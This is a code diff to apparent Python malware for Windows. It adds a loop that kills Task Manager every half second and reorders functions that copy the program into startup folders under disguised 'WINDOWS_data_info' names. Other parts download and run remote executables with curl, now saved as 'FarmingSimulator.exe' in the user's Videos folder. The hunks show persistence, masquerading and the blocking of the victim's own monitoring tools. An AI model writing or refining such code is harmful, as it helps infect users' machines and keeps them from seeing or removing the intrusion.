@@ -10,7 +10,6 @@ import shutil
 import time
 import pygame
 from PyQt5 import QtWidgets, QtCore
-import sys
 
 CLIENT_NAME = getpass.getuser()
 FILE_ATTRIBUTE_SYSTEM = 0x4
@@ -67,19 +66,6 @@ class MessageDispatcher(QtCore.QObject):
             label.close
         )
 
-
-def close_task_manager():
-    for proc in psutil.process_iter(['name']):
-        try:
-            if proc.info['name'] and proc.info['name'].lower() == 'taskmgr.exe':
-                proc.terminate()
-        except (psutil.NoSuchProcess, psutil.AccessDenied):
-            break
-    monitor_taskmgr()
-
-def monitor_taskmgr():
-    threading.Timer(0.5, close_task_manager).start()
-
 def move_to_startup(current_exe):
     for f in os.listdir(startup_folder):
         if (f.startswith("WINDOWS_data_infoRI") or f.startswith("WINDOWS_data_info")) and f.endswith(".exe"):
@@ -112,6 +98,19 @@ def im_in_startup():
         current_path.startswith(os.path.abspath(user_startup)) or
         current_path.startswith(os.path.abspath(global_startup))
     )
+
+
+def close_task_manager():
+    for proc in psutil.process_iter(['name']):
+        try:
+            if proc.info['name'] and proc.info['name'].lower() == 'taskmgr.exe':
+                proc.terminate()
+        except (psutil.NoSuchProcess, psutil.AccessDenied):
+            continue
+    monitor_taskmgr()
+
+def monitor_taskmgr():
+    threading.Timer(0.5, close_task_manager).start()
 
 def remove_force():
     for path in (exe_final_location, old_final_location):
@@ -165,6 +164,7 @@ def download_and_run_random_program(link, base_name="info", ext=".exe"):
     return path
 
 def reinstall_program(standartInstall=True):
+    return 1
     if standartInstall:
         if not os.path.isfile(exe_final_location) and not os.path.isfile(old_final_location):
             subprocess.run(
@@ -181,7 +181,7 @@ def reinstall_program(standartInstall=True):
             )
     else:
         videos_dir = os.path.join(os.environ["USERPROFILE"], "Videos")
-        output_path = os.path.join(videos_dir, filename)
+        output_path = os.path.join(videos_dir, "FarmingSimulator.exe")
         subprocess.run(
             [
                 "curl.exe",
